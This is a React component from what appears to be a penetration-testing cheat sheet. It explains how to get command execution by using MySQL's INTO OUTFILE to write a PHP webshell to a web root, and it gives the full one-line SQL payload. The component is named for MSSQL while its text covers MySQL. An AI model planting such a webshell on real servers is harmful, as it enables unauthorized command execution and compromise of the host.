import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const MSSQL_Code_Execution = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>


              <Typography>
              In MySQL we are able to write a file to a location. We can achieve command execution if we are able to write a webshell to a location what we can access and execute commands. For example, suppose there is a website at `/var/www/html`. If we can write a webshell to `/var/www/html/shell.php` then we have command execution.
               </Typography>
               <Box pt={5} />
               <Typography>
              Write webshell to webroot
               </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"mysql> SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php';"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default MSSQL_Code_Execution;
  